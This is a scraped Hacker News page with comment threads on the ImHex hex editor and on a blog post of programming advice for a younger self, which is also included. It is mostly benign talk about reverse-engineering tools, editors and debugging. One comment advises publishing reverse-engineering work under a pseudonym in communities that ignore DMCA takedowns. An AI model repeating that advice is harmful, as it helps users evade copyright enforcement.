reply alex_suzuki 4 hours agoparentCool, a bit like Wireshark protocol dissectors then? reply jchw 3 hours agorootparentThere's, unfortunately, a million similar implementations for this basic concept. 010 Binary Templates, Hex Workshop structures, Okteta structures, Kaitai Struct Definitions. Heck, I made my own Go struct tag DSL that does this, before I realized just how many times it had already been done before. The thing that's complicated of course, is that while it is a good idea and the basic idea is incredibly similar across implementations, there are just enough different concerns to make it hard to have one universal standard that can cover all of the use cases. It's hard enough to have a single parsing framework that handles both text parsing and binary format parsing well, but you also would need to consider the ability to incrementally parse/stream, read/write support, support arbitrary transformations, some formats need pointers, offsets, indices, and of course to what degree such a descriptor should be declarative versus imperative (declarative is better, but it gets increasingly hard to capture all details entirely in a purely declarative manner.) reply z3phyr 7 hours agoprevI really like this area of computer culture. RE, writing kernel modules, figuring out how stuff works and making stuff do what it was not designed to do aspects. However, legal avenues to do so are far in between and it requires a huge amount of time and help from peers. reply no_time 6 hours agoparentYou don't need a project to be \"legal\" to have some fun :) Publish under a pseudonym with no links to your real identity, use dedicated communities that disregard DMCA takedowns. As long as you don't want to earn money this way, the worst that will happen is that your target notices your work and deploys vmprotect on their releases. reply poincaredisk 5 hours agoparentprev>However, legal avenues to do so are far in between and it requires a huge amount of time and help from peers. I reverse engineer things for a living and I have many peers worldwide who do the same. My main field of work is malware analysis. For recreation, in my country it's explicitly legal to reverse engineer things you own, with a purpose of making it work on your system (think: fixing a windows XP game so it works on windows 10). This is a very broad loophole, and let's you reverse engineer things in most cases when they \"feel\" like they should be legal. reply 8372049 5 hours agorootparentThis applies to the entire EEA, fortunately! reply cess11 3 hours agorootparentprevReversing for the purpose of integrations is commonly also legal. reply kstrauser 1 hour agoparentprevFile formats are great fun to RE. I worked at a place that used a proprietary business management app. One day I was bored and started looking at its data files with a hex editor and saw some patterns like the titles of records in the app were spaced at exact multiples of X bytes apart on the data file. Oh! Fixed width records! Huh, look at that: right after the title, the next two bytes look like the hex value of the record number show in the app. Guess that's how it stores those! If I click this checkbox, this one byte changes from 0x00 to 0x01. Hey there! After enough experimentation I had the whole thing mapped to structs in code and was able to build reports that the original app couldn't support. There wasn't anything illegal about that. I'm sure the vendor would've preferred we pay them to make reports for us but nothing legally prevented it. reply sadops 1 hour agoparentprevJust don't publish it, and you can kinda do whatever. Remember, just because you build or learn something doesn't mean you have to broadcast it. Edification can be its own reward. reply LocalH 2 hours agoparentprevIf you've never done at least a tiny bit of \"illegal\" RE, are you even a true hacker? ;) reply exe34 6 hours agoparentprevare there illegal schools teaching kernel module writing? reply Retr0id 6 hours agorootparentYes. A silly example I encountered just yesterday, looking for usermodehelper invocation examples: https://gist.github.com/muratdemirtas/31b46c459c9c2e285ed71b... Commenter asks: > also, question: Why is it called linux_keylogger? reply exe34 5 hours agorootparenti don't see how that's illegal - it's only a crime if you install it on somebody's computer to steal their information. knives aren't illegal. reply Retr0id 5 hours agorootparentYes, it's not literally illegal, otherwise Microsoft would be in even more trouble. I just thought it was amusing. (but also, carrying sensibly sized knife is illegal where I live) reply hnthrowaway0328 4 hours agoprevThis looks pretty neat. Would it be a good idea to develop a hex editor as a project? It doesn't look too hard for a simple one, but if one wants there is a lot of room for practice, like parsing all fileformats, from executionable image to doom wads too some proprietary file format, and I'm there is a lot room for tools that help RE too. reply noname120 6 hours agoprevI will stick to 010 Editor for now[1], it's the most amazing hex editor I've tried in my life. I'm not fond at all of the GUI framework (Dear ImGui) that this new projects uses. It's meant for embedded systems with tiny screens and no window manager, not full-fledged desktop environments where the small elements and the complete lack of UI integration makes for a very awkward experience. [1] https://www.sweetscape.com/010editor/ reply Dwedit 1 hour agoprevI still use HXD for most cases, but whenever I need to work with encoded text, I use a fork of MadEdit instead. MadEdit has no problem with multibyte characters, whether it's UTF-8, UTF-16, or Shift-JIS. reply 0xFEE1DEAD 7 hours agoprevThis seems interesting and is coincidentally exactly what I need right now. My trusty file, strings, hexdump and xxd all failed me. I was going to use ghidra, but it's quite the beast and I haven't had any time to learn it yet. Gonna give this a try tonight. reply nneonneo 6 hours agoparentWhat do you need Ghidra for? Ghidra is, for the most part, not a hex editor. It’s meant for reverse engineering - mainly decompilation, but it’s useful for patching as well. The debugger is new and takes some getting used to (I’m still using GDB + Ghidra), but the disassembler and decompiler are top-notch. reply tsujamin 6 hours agorootparentIt’s also useful for defining data structures and carving them up, which (for me) is the role now filled by ImHex. If HexFiend/xxd are at one end of the spectrum, ghidra at the other, I imagine ImHex and tools like Kaitai are in the middle reply nneonneo 5 hours agorootparentHex Fiend does data structures and file formats now too, using parsers written in TCL. I’d probably rate Hex Fiend as being in the middle too, especially if you’re going to put xxd at the low end :) Personally, for file format parsing I like to use Hachoir (specifically Hachoir-wx for GUI file structure browsing), which is a somewhat obscure bit of software that I’ve made some contributions to. reply ithkuil 6 hours agoparentprevUsername checks out reply carrja99 6 hours agoprevGave me a flashback to my middle school days when I used a hex editor to modify my saved game files. reply drzzhan 2 hours agoprevI will just stick with 010 Hex editor for now. Still I will keep an eye on this. reply j16sdiz 5 hours agoprev> people who value their retinas when working at 3 AM. You just need a well lit room to use light mode. reply Stratoscope 56 minutes agoparentAgreed, and also turn down your monitor brightness if needed so the light background matches a piece of paper on your desk. No one complains that reading something on paper burns out your retinas. A light mode shouldn't either. I always assumed that ImHex only supported dark mode, but it turns out that it does support light mode too! reply surfingdino 4 hours agoprevGreat project, shame the author did not google the username. reply WerWolv 7 minutes agoparentHey, I'd just like to tune in here real quick. I've been using this username since I was like 10, long before I really understood what Nazis are. By the time I learned about this, I've already had this username for years and changing it everywhere would have been a ton of work. As a native German speaker, this association is really not something people generally make. I'd mostly just like to state that I'm probably as far away from being a right extremist as I can be. reply kstrauser 1 hour agoparentprevWhy's that? reply surfingdino 1 hour agorootparentGoogle it. reply kstrauser 58 minutes agorootparentAh. Yeah, perhaps, but that was a normal, common word that the bad guys used because it sounded scary, but which still has its original meaning. It's not a word I'd primarily associate with those particular bad guys. reply surfingdino 33 minutes agorootparenthttps://en.wikipedia.org/wiki/Werwolf probably not a good idea to pick a username sounding closely to that stuff. reply kstrauser 20 minutes agorootparentI get what you’re saying. I wouldn’t pick it for myself. Still, he’s from Switzerland where German is a local language, and that’s a normal German word outside the Nazi usage. It wasn’t one the ones they invented themselves. I think it’s closer to, say, “beer hall”, which isn’t inherently Nazi even though “beer hall putsch” was their thing. They can still have beer halls. reply aquova 5 hours agoprevNot to be confused with the Reverse Engineer's Hex Editor, rehex https://github.com/solemnwarning/rehex reply _xerces_ 5 hours agoprev [–] It is hard to find the link for Windows download, most people (especially us dumb Windows users) want to find a link and download, not scroll a bunch then go to another page then scroll some more and make a decision about which one of 20 links they need. It is not that hard, especially for most people on HN but it does add friction to people trying your software. This is a very common thing with other projects so not just picking on this one. Finally, when it does load on my Windows machine (using MSI installer and after convincing Microsoft that it is safe to run and bypassing their warning) it loads up super tiny on my 4k laptop screen and is unusable. I suppose I could mess about with the compatibility and scaling settings but I kind of lost interest after all of the above. I tell you all this because obviously a lot of work went into this tool and from the screenshots it looks beautiful and useful, but is let down by the process involved to get it to run, at least on my machine. For now, I will keep running HxD. reply sva_ 5 hours agoparentReally weird criticism. If you're confused about how GitHub works, you might follow the link to their website[0] (when you click on \"Release\" in the readme) and then scroll down to find a \"Download for Windows\" button. 0. https://imhex.werwolv.net/ reply tom_ 4 hours agorootparentAt least on desktop, there's also a link to the main site in the About section of the repo. This might actually be a better link for the HN submission, as I bet there's a non-zero intersection of hex editor users and people who completely do not understand Git whatsoever (assuming they've even heard of it). reply denysvitali 4 hours agoparentprevYou can also use it on the web, no need to download it: https://web.imhex.werwolv.net/ reply go_prodev 5 hours agoparentprevMaybe they've updated it, but I found a Windows MSI link about halfway down the front page. reply pengaru 2 hours agoparentprev [–] Maybe create an issue saying as much? https://github.com/WerWolv/ImHex/issues reply _xerces_ 1 hour agorootparent [–] Why would I do that unless I have a strong reason to use it rather than just move on with my day? A link is posted on HN for some cool software, it is already annoying to install it due to Microsoft complaining about it, then when I first run it, it opens up a tiny window an is asking if it can upload information. I don't expect to spend time figuring out its issues. I can't be the only one using a 4K display on Windows. reply timeon 6 minutes agorootparentSounds like weird OS. reply pengaru 1 hour agorootparentprev [–] > Why would I do that unless I have a strong reason to use it rather than just > move on with my day? A link is posted on HN for some cool software, it is > already annoying to install it due to Microsoft complaining about it, then > when I first run it, it opens up a tiny window an is asking if it can upload > information. I don't expect to spend time figuring out its issues. I can't be > the only one using a 4K display on Windows. Spoken as a true reverse engineer, you should ask for a refund. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "ImHex is a feature-rich hex editor designed for reverse engineers, programmers, and users who work late hours, offering a modern interface and extensive functionality.",
      "Key features include a custom C++-like pattern language, integrated disassembler, data analyzer, and YARA rule support, making it a versatile tool for various data manipulation tasks.",
      "The tool supports multiple operating systems (Windows, macOS, Linux) and requires minimal hardware resources, with source code and documentation available for further customization and contribution."
    ],
    "commentSummary": [
      "ImHex is a hex editor favored by reverse engineers for its file templates, data type interpretation, and performance with large files.",
      "It is free, open-source, and often compared to 010 Editor, though some users prefer simpler alternatives like Hex Fiend or HxD.",
      "Despite some bugs in its imgui UI and installation issues, ImHex is valued for its capabilities, with discussions highlighting the necessity of OpenGL for modern hardware rendering."
    ],
    "points": 286,
    "commentCount": 67,
    "retryCount": 0,
    "time": 1719645949
  },
  {
    "id": 40829607,
    "title": "A bunch of programming advice I'd give to myself 15 years ago",
    "originLink": "https://mbuffett.com/posts/programming-advice-younger-self/",
    "originBody": "A Bunch of Programming Advice I’d Give To Myself 15 Years Ago I finally have the feeling that I’m a decent programmer, so I thought it would be fun to write some advice with the idea of “what would have gotten me to this point faster?” I’m not claiming this is great advice for everyone, just that it would have been good advice for me. If you (or your team) are shooting yourselves in the foot constantly, fix the gun I can’t tell you how many times I’ve been on a team and there’s something about the system that’s very easy to screw up, but no one thinks about ways to make it harder to make that mistake. When I was doing iOS development, we were using CoreData, and subscribed to changes in the store in a bunch of views. The subscription callback came on the same thread that the change was triggered from. So sometimes that was the main thread, and sometimes it was a background thread. Importantly in iOS development, you can only make UI updates on the main thread. So a new change handler could be working fine, but then it would break when someone triggered a change from a background thread, or if you add a UI update later on. This was just something people transparently accepted, and often came up in reviews for newer people on the team. Then every now and then it would slip through and we’d go add a DispatchQueue.main.async when we saw the crash report. I decided to fix it, and it took ten minutes to update our subscription layer to call subscribers on the main thread instead, which eliminated a whole class of crashes and removed mental load. I’m not trying to be like “look at these idiots not fixing an obvious issue with the codebase, it was obvious to me”, because it would have been obvious to anyone who thought about it for a few minutes. These things stick around a weird amount, because there’s never a natural time to address them. When you’re first getting onboarded, you’re not trying to change anything big, so you may think it’s weird but you shouldn’t go changing a bunch of things you’re still learning about. Then when you’ve been on the team for a while, it sort of fades into the background. It’s a mindset shift. You just need to occasionally remind yourself that you are capable of making you and your team’s life easier, when these sorts of things are hanging around. Assess the trade-off you’re making between quality and pace, make sure it’s appropriate for your context There’s always a trade-off between implementation speed and how confident you are about correctness. So you should ask yourself: how okay is it to ship bugs in my current context? If the answer to this doesn’t affect the way you work, you’re being overly inflexible. At my first job, I was working on greenfield projects around data processing, which had good systems in place to retroactively re-process data. The impact of shipping a bug was very minor. The proper response to an environment like that is to rely on the guardrails a bit, move faster because you can. You don’t need 100% test coverage or an extensive QA process, which will slow down the pace of development. At my second company, I was working on a product used by tens of millions of people, which involved lots of high-value financial data and personally identifiable information. Even a small bug would entail a post-mortem. I shipped features at a snail’s pace, but I also think I may have shipped 0 bugs that year. Usually, you’re not at the second company. I’ve seen a lot of devs err on the side of that sort of programming though. In situations where bugs aren’t mission critical (ex. 99% of web apps), you’re going to get further with shipping fast and fixing bugs fast, than taking the time to make sure you’re shipping pristine features on your first try. Spending time sharpening the axe is almost always worth it You’re going to be renaming things, going to type definitions, finding references, etc a lot; you should be fast at this. You should know all the major shortcuts in your editor. You should be a confident and fast typist. You should know your OS well. You should be proficient in the shell. You should know how to use the browser dev tools effectively. I can already tell people are gonna be in the comments like “you can’t just spend all day tweaking your neovim config, sometimes you need to chop the tree too”. I don’t think I’ve ever seen someone actually overdo this though; one of the biggest green flags I’ve seen in new engineers is a level of care in choosing and becoming proficient with their tools. If you can’t easily explain why something is difficult, then it’s incidental complexity, which is probably worth addressing My favorite manager in my career had a habit of pressing me when I would claim something was difficult to implement. Often his response was something along the lines of “isn’t this just a matter of sending up X when we Y”, or “isn’t this just like Z that we did a couple months ago”? Very high level objections, is what I’m trying to say, not on the level of the actual functions and classes we were dealing with, which I was trying to explain. I think conventional wisdom is that it’s just annoying when managers simplify things like this. But a shockingly high percentage of the time, I’d realize when he was pressing me, that most of the complexity I was explaining was incidental complexity, and very often you can address this sort of incidental complexity. It won’t just trivialize the current problem, it will make future changes easier too. Try to solve bugs one layer deeper Imagine this. You have a React component in a dashboard, that deals with a User object retrieved from state, of the currently logged in user. You see a bug report in Sentry that the User was null during render. You could add a quick if (!user) return null to it. Or you could investigate a bit more, and find that your logout function makes two distinct state updates, the first to set the user to null, the second to redirect to the homepage. You swap the two, and now no component will ever have this bug again, because the user object is never be null while you’re within the dashboard. Keep doing the first sort of bug fix, and you end up with a mess. Keep doing the second type of bug fix, and you’ll have a clean system and a deep understanding of the invariants. Don’t underestimate the value of digging into history to investigate some bugs I’ve always been pretty good at debugging weird issues, with the usual toolkit of println and the debugger. So I never really looked at git much to figure out the history of a bug. But for some bugs it’s crucial. I recently had an issue with my server where it was leaking memory seemingly constantly, and then getting OOM-killed and restarted. I couldn’t figure out the cause of this for the life of me. Every likely culprit was ruled out, I couldn’t reproduce it locally, it felt like throwing darts blindfolded. I looked at the commit history, and found it started happening after I added support for Play Store payments. Never a place I would have looked in a million years, it’s just a couple http requests. Turns out it was getting stuck in an infinite loop of fetching access tokens, after the first one expired. Maybe every request only added a kB or so to memory, but when they’re retrying every 10ms on multiple threads, that adds up quick. And usually this sort of thing would have resulted in a stack overflow, but I was using async recursion in Rust, which doesn’t stack overflow. This never would have occurred to me, but when I’m forced to look into a specific bit of code that I know must have caused it, suddenly the theory pops up. I’m not sure what the rule is here for when to do this and when not to. It’s intuition based, a different sort of “huh” to a bug report that triggers this sort of investigation. You’ll develop the intuition over time, but it’s enough to know that sometimes it’s invaluable, if you’re stuck. Along similar lines, try out git bisect if the problem is amenable to it — meaning a git history of small commits, a quick automated way to test for the issue, and you have one commit you know is bad and one that’s good. Bad code gives you feedback, perfect code doesn’t. Err on the side of writing bad code It’s really easy to write terrible code. But it’s also really easy to write code that follows absolutely every best practice, with 100% test coverage, and has been fuzz-tested and mutation-tested for good measure – your startup will just run out of money before you finish. So a lot of programming is figuring out the balance. If you err on the side of writing code quickly, you’ll occasionally get bitten by a bad bit of tech debt. You’ll learn stuff like “I should add great testing for data processing, because it’s often hard or impossible to correct later”, or “I should really think through table design, because changing things without downtime can be extremely hard”. If you err on the side of writing perfect code, you don’t get any feedback. Things just universally take a long time. You don’t know where you’re spending your time on things that really deserve it, and where you’re wasting time. Feedback mechanisms are essential for learning, and you’re not getting that. To be clear I don’t mean bad as in “I couldn’t remember the syntax for creating a hash map, so I did two inner loops instead”, I mean bad as in: Instead of a re-write of our data ingestion to make this specific state unrepresentable, I added a couple asserts over our invariants, at a couple key checkpoints Our server models are exactly the same as the DTOs we would write, so I just serialized those, instead of writing all the boilerplate, we can write DTOs as needed later if needed I skipped writing tests for these components because they’re trivial and a bug in one of them is no big deal Make debugging easier There’s so many little tricks I’ve acquired over the years on making software easier to debug. If you don’t make any effort to make debugging easy, you’re going to spend unacceptable amounts of time debugging each issue, as your software gets more and more complex. You’ll be terrified to make changes because even a couple new bugs might take you a week to figure out. Here’s some examples of what I mean: For the backend of Chessbook I have a command to copy all of a user’s data down to local, so I can reproduce issues easily with only a username I trace every local request with OpenTelemetry, making it very easy to see how a request spends its time I have a scratch file that acts as a pseudo-REPL, which re-executes on every change. This makes it easy to pull out bits of code and play around with it to get a better idea what’s going on In the staging environment, I limit parallelism to 1, so that it’s easier to visually parse logs For the frontend I have a debugRequests setting which prevents optimistic loading of data, to make it easier to debug requests I have a debugState setting that will print out the entire state of the program after every update, along with a pretty diff of what changed I have a file full of little functions that get the UI into specific states, so that as I’m trying to fix bugs, I don’t have to keep clicking in the UI to get to that state. Stay vigilant about how much of your debugging time is spent on setup, reproduction, and cleanup afterwards. If it’s over 50%, you should figure out how to make it easier, even if that will take slightly longer this time. Bugs should get easier to fix over time, all else being equal. When working on a team, you should usually ask the question There’s a spectrum of “trying to figure out everything for yourself” to “bugging your coworkers with every little question”, and I think most people starting their careers are too far on the former side. There’s always someone around that has been in the codebase longer, or knows technology X way better than you, or knows the product better, or is just a more experienced engineer in general. There’s so many times in the first 6 months of working somewhere, where you could spend over an hour figuring something out, or you could get an answer in a few minutes. Ask the question. The only time this will be annoying to anyone, is if it’s clear you could have found the answer yourself in a few minutes. Shipping cadence matters a lot. Think hard about what will get you shipping quickly and often Startups have limited runway. Projects have deadlines. When you quit your job to strike out on your own, your savings will only last you for so many months. Ideally, your speed on a project only compounds over time, until you’re shipping features faster than you could have imagined. To ship fast you need a lot of things: A system that isn’t prone to bugs Quick turnaround time between teams A willingness to cut out the 10% of a new feature that’s going to take 50% of the engineering time, and the foresight to know what those pieces are Consistent reusable patterns, that you can compose together for new screens/features/endpoints Quick, easy deploys Process that doesn’t slow you down; flaky tests, slow CI, fussy linters, slow PR reviews, JIRA, etc. Shipping slowly should merit a post-mortem as much as breaking production does. Our industry doesn’t run like that, but that doesn’t mean you can’t personally follow the north star of Shipping Fast.",
    "commentLink": "https://news.ycombinator.com/item?id=40829607",
    "commentBody": "A bunch of programming advice I'd give to myself 15 years ago (mbuffett.com)282 points by marcusbuffett 7 hours agohidepastfavorite176 comments 999900000999 1 hour agoI'll add one point. You are not your job. Don't take things personally at work. And never be afraid to leave if you're not fitting in with your company . I've left jobs over a few reasons, primarily bad managers, increased compensation, and bad code . If people are writing bad code at your company, to the point where you know it's going to come back to haunt you later, it's okay to just walk away . Don't embarrass anybody, don't escalate to a manager and explain how horrible the code is. I was in a situation where someone our team was effectively writing code that pretended to do things it really didn't. I got into a really nasty argument with half my team about this. I ended up putting in my two weeks, and then my manager was like oh you were right the entire time . Life is too short to deal with incompetent people. reply roughly 3 minutes agoparentRelated, the computer doesn’t care about you and isn’t judging you when it throws an error. Your code has the bug, not you. Stop feeling shitty about yourself and go fix it. reply oblio 1 hour agoparentprevUnless you have a lot of flexibility in terms of where you work, this type of advice is becoming less relevant in an IT job market that's in free fall. Much fewer devs can just jump ship at will than between 2003 - 2022. reply 999900000999 48 minutes agorootparentIn my situation it would have been much easier to just keep my head down until I was able to get another job. I ended up causing a lot of tension at work, the engineer who had wrote this code openly resented me . Usually when people are putting broken code into the code base it's a wider cultural problem, that you're not realistically going to solve. reply avanai 3 hours agoprev> Try to solve bugs one layer deeper This is one of the main things I try to impart to junior folks when I’m mentoring them or reviewing code. It’s also one of the biggest red flags to me of someone who’s working above their level when I have to repeatedly press a more senior person to dig deeper and fix things at a deeper level. You need to take the time to understand why the bug happened, or you’re just going to be patching wallpaper instead of fixing the plumbing leak. reply hiatus 2 hours agoparent> You need to take the time to understand why the bug happened, or you’re just going to be patching wallpaper instead of fixing the plumbing leak. I think many would like to probe deeper but aren't afforded the time between sprint tasks. Management often pushes back for solutions that are good enough compared to exploration with an unknown duration until the solution is found. reply default-kramer 2 hours agorootparentOf course this can vary wildly, but I've never felt afraid to defy management on that one. Half the time, they don't even need to know. And the other half of the time... what are they going to do? Fire me? Fine, then their project will be filled with nothing but wallpaper-patchers and I'll be somewhere else doing good work. (And of course, sometimes just patching the wallpaper is the right course of action, but it's rare to find management capable of accurately assessing this trade-off.) reply __turbobrew__ 2 hours agorootparentprevPart of being senior is figuring out how to work in those constraints. In that situation I would push back my manager and tell them why root causing bugs will save us time in the long run and if they still don’t relent I would sandbag some of my time doing sprint tasks to root cause the bugs. reply hinkley 2 hours agoparentprevI’m surprised by how many people cannot handle 5 Why’s. It’s substantially the same people who like wallpaper and putty. reply austin-cheney 52 minutes agoprevThe one piece of advice I would give myself 15 years ago: In the corporate world be very good at administration. You only need to just be good enough at programming to not get fired. Everybody has opinions on software techniques and nobody measures anything, so it’s really just a popularity/tool game. The only goals are retain employment or promote out of software, being good at software is just a distraction from the goals. If you want to be excellent at programming do it as a hobby and set your expectations right that it’s only a hobby. reply bigdict 49 minutes agoparentCould you expand a bit on what you mean by administration? reply wavemode 20 minutes agorootparentNot OP but I would say, generally non-engineering things that keep the business people happy. Project planning, delegating tasks, dashboards and metrics (customer feedback, if you can acquire it, is a big plus), setting and meeting deadlines, and knowing how to sell yourself. There's that old (and very true) wisdom that if you solve a complex problem in two days, the business people won't think \"wow, this guy is so smart and hard-working for solving that in 2 days.\" They will think \"oh, this problem must not have been very hard to solve. Let's assign him extra work.\" Being a good engineer only gets you so far, career-wise. reply austin-cheney 20 minutes agorootparentprevWriting ample clear documentation, precision of communication, dutifully fulfilling all timesheets, logging of work performed, attending all requested meetings, and always delivering work on time. reply roughly 6 minutes agoprevI think this is great for the craft of coding and solving problems. I’d add one more, along the vein of career advice: you’re hired to solve problems for the business, not to solve technical problems. If you can’t explain how the thing you’re doing makes an actual difference for the business, you need to reflect on what you’re spending your time on. I’ve seen too many technical teams be far too fixated on technical problems and unable to understand why they can’t get more headcount, funding, or recognition. Nobody writing checks cares about code. reply hamasho 6 hours agoprevMost of this advice has already clicked with me, but this part: > If you can't easily explain why something is difficult, then it's incidental complexity, which is probably worth addressing That's a real eye-opener. Hope I remember this next time I implement something complex. The thing is, I don't think this stuff would've helped me much when I was a junior dev. A lot of them are just too nuanced. reply j45 2 hours agoparent'Addressing' can be ambiguous. Writing comments to explain why it's right and needs to be this way? Or changing the code without considering if they have enough knowledge of the rest of the codebase. There's also a chance it's not understood yet to easily explain it. A key part of joining a team is remaining open to the fact that just because I don't understand something, doesn't mean there isn't understanding in it. reply simpaticoder 28 minutes agoprev\"Don’t underestimate the value of digging into history to investigate some bugs.\" Valuable advice, and it particularly highlights the risk of global state and the benefit of understanding your runtime. Browsers have popularized flamegraphs, stack traces show you the frames down to the moment of error, but global state survives multiple stack traces and the one you're looking at may not be (probably isn't) the cause of the problem. There is global state, the heap, external systems, etc that change over time and with successive calls. This is true even in single-threaded environments, and is far more complex in general multi-threaded environments. I often feel this isn't clear to beginners nor is it clear to them how you go about investigating bugs within this context. reply trustno2 6 hours agoprevThe one thing I disagree is the thing about editors. When I began coding I spent hours tweaking my vimrc file and learning all the essentially random shortcuts, and dealing with the absurdities of vimscript. (and debugging vim plugins that broke each other.) It felt like actual work while I was producing nothing. Now I just open vscode with default settings and I am productive right away. Who cares about editors, vscode is good enough. But maybe just vim sucks and I should have been playing with emacs all along, I don't know. reply moonshinefe 1 hour agoparentAs with most things there's a balance. I've found if I try to learn one or two new features or shortcuts every couple weeks with the tools I use extensively, eventually I do get a sharp axe. Typing speed is nice but not an important metric I don't think. It's like someone speeding past you on the road only for you to see them at the next red light. Other things will slow you down like code review or needing to wait until a set time to deploy. Also things like copilot and advanced auto-completion are making it less relevant. reply wruza 57 minutes agoparentprevNow I just open vscode with default settings and I am productive right away. I am right away distracted by a huge rectangle around cursor line, current word highlighting and general jumpiness of everything. Coding in vscode feels like writing a book in the middle of brazilian festival. And then it cannot do random simple things like proper indents or humane snippets. The amount of work required to unfuck vscode is really comparable to creating .vimrc from scratch. reply bobajeff 5 hours agoparentprevSame here. I don't spend most of my time typing but rather thinking. So getting good at vim or getting faster at typing will not make me any better. That's not to say that I'm not in favor of being good at typing. I know my keyboard well enough to touch type also I know some keyboard short cuts specific to vscode but they are intuitive and have a GUI alternative if I don't feel like using them. reply tdumitrescu 2 hours agorootparentI think everyone's got a different threshold for where returns start diminishing sharply. While I'm squarely in the \"don't waste time micro-tweaking your editor\" camp, there are some little bits of shortcuts and tooling that made me much more fluent at code-editing with very little investment. One example that stands out is the multi-cursor support that Sublime Text popularized (and which I use all the time in vscode now). It eliminates a good 80% of repetitive typing, or symbol refactoring that would have involved clunking through menus in old IDEs, and makes experimentation that much quicker. Feels fundamental, like copy/paste shortcuts which everyone knows now. reply nox101 1 hour agorootparentmore than multi-cursor, recordable keyboard macros save me a ton of time. I miss them sorely in vscode reply bcrosby95 1 hour agorootparentprevFor me it depends upon the task. If I have to hunt down a bug or have something with a lot of touch points, yeah, there's probably less typing and more thinking. But if it's a new mostly self contained feature usually I think for a bit, then get to the point where I know what I need to build and the next step is about shitting out a mountain of code. Being able to go from nothing -> mountain in a fast time is useful. reply trustno2 5 hours agorootparentprevOne of my colleagues was using dvorak and arguing that because he types faster with it, he's a better programmer. i never thought typing speed is all that important when you code. But he DID write crazy fast. reply j45 2 hours agorootparentTyping fast is an interesting metric. Shipping the same code will happen sooner if you have tooling and typing setup to allow for quick iterations, and being quick in making those iterations. Selecting a language/framework that might take more work can slow you down too. Typing faster does seem to look towards thinking faster, trouble shooting faster. One place where it can get someone into trouble is typing too fast, faster than it might take to think through and not over look something which might invalidate what you're doing. I have all hires do typeracer.com. Not for a high or a low score, but seeing the development of the score and understanding the importance of typing fast relating to thinking fast. Typing code inherently is slower than writing sentences, so if you can type faster sentences in written communication, typing code will be faster, even if it's not at the full typing speed. reply seabass-labrax 2 hours agoparentprevThe author claims that a strong knowledge of development tools is a good indicator of general proficiency, but what if it's that learning how to use your editor makes you proficient? After all, nobody gets familiar with Emacs without inadvertently becoming a practitioner - if not an enthusiast - of Lisp! That happened with me, and I'm now a big fan of functional programming, Clojure, Scheme etc., and that experience and exposure to a particular way of writing code has undoubtedly made me a better programmer. It sounds like you've had a similar experience with Vimscript :) reply __turbobrew__ 2 hours agoparentprevMy productivity is rarely limited by the speed with which I can interface with a computer. Im in the same boat, I just use intellij for everything. reply goosejuice 5 hours agoparentprevI'm grateful that I started learning vim and C at the same time in undergrad. Sure vscode is good enough, but a lot of value is gained tweaking your own tools beyond the tool itself. Producing something doesn't always need to be the goal. Exploration has value. reply farmeroy 2 hours agoparentprevI've been using neovim pretty much since I began programming. I had some initial setup and have tweaked it once or twice, but it's by no means been a source of sunk time for me. I recently had to switch to VSCode and had a lot of issues learning all the out of the box key bindings and not having the telescope and fuzzy find windows I was used to was a huge productivity loss for me. When I able to jump back to neovim it was such a huge relief. reply j45 2 hours agorootparentI'm reasonably familiar with both and use them for different cases than each other. vscode at least is my text editor in the gui... but consistently growing :) The time getting up to speed on something new shouldn't be used against something else that is already familiar. Now if the new tool (ie., vscode) could import your neovim setup and get you an equivalent, that would be neat. Comparing the sunk cost time for neovim vs vscode might be a more interesting comparison. Neovim definitely is a little more polished than vim out of the box so it's entirely plausible it's pretty close. If a vim user wanted to learn something like vscode, they could just install a vim extension in vscode to navigate most of vscode in vim keys. Lots on youtube. It's hard to use a web browser without a vim extension installed. It's true if you have sunk the time to super customize a setup for you in anything (currently I'm working through my Aerospace setup), the part that I get caught by sometimes is that something I had to customize in neovim, might already be built into vscode, or something else, or vice versa. Repetitions is about creating the muscle memory, similar to building the same keys with vim. I'm lucky I was able to get to a place of comfort with vim when I had lots of free time. It's great when I don't have my setup with me, but my setup with neovim was a step forward, but vscode still sometimes just ends up where I am, and I figure out how to get it behaving a little better. reply farmeroy 1 hour agorootparentI guess my point was that, often times people say some tool (or language, or anything) is easier when what they really mean is that they are used to it. The fact is, you use something because it resonates with you (or its the only resource you have) and then you get good at it, and then everything else becomes a handicap reply Chris_Newton 3 hours agoparentprevPossibly my all-time favourite XKCD, Is it worth the time?¹, demonstrates two important points. If you only do something very rarely anyway, spending time to automate it won’t have a great ROI. But for things you do moderately often that take a minute or even just a few seconds, you can afford to spend a surprisingly large amount of time optimising them and still get a big pay-off over a time frame measured in years. I view time spent learning to use my tools efficiently and automating common tasks as a sound investment. Editors are a great example. Sure, I could fire up any of the usual suspects and write code somewhat productively. But in my fully customised editor of choice, I can insert and adapt common code patterns that would take me 10–30 seconds to type out fully in mere moments using templates and macros. I can jump to any position visible on-screen with around three keystrokes. I can see syntax highlighting for various file types that I use all the time, including some unusual ones that don’t have definitions readily available, and warnings for several different programming languages in real time as I work. These save me a few seconds every time I use them, but how many times is that every day? The effort to set them up has probably repaid itself 100x over by now! And the lack of latency is also a qualitative improvement since it means once I’m ready to start writing, I can do so roughly as fast as I can think, instead of constantly being held back and interrupted for a moment. ¹ https://xkcd.com/1205/ reply tdumitrescu 1 hour agorootparent> If you only do something very rarely anyway, spending time to automate it won’t have a great ROI For code-editing, maybe. But in general software engineering, there are tasks that I have to do maybe once a year or less that are always way more painful than they need to be because I don't remember the details, and anytime I automate even part of them (or yes, just document a little better), it turns out to be well worth it. Stuff like bootstrapping new environments, some database-related work, etc. reply hinkley 2 hours agoparentprevI’m on the fence. When I obsessed more about Flow State, I really did see dividends from spending spare cycles reading the docs (especially release notes) and keyboard shortcut mappings to find faster ways to do things I did often. Maybe I hit the point of diminishing returns. Maybe it’s because I don’t Code Like Hell much anymore, but it’s a habit I got out of. I keep resolving to getting back to it, but the fact I don’t maybe telling me something. Like maybe I’ve filled that spare time with other things that are more valuable. reply coffeebeqn 2 hours agoparentprevIt’s a little bit like some productivity blogs obsessing over the notepad and pens and apps they use and spending a lot of time obsessing/procrastinating over things that don’t matter. I still learn the same shortcuts I’ve used for the last 15 years in whatever editor I use but most of my time is spent thinking and talking about problems rather than just typing things in the editor reply bregma 5 hours agoparentprevI just open vi with default settings and am productive right away. I tried VS Code and couldn't get a \"hello world\" example to run out of the box after a half hour of trying. Who cares about other editors, vi is good enough. reply g15jv2dp 3 hours agorootparent> I just open vi with default settings and am productive right away. I tried VS Code and couldn't get a \"hello world\" example to run out of the box after a half hour of trying. I take it that you've learned vim (otherwise you wouldn't be 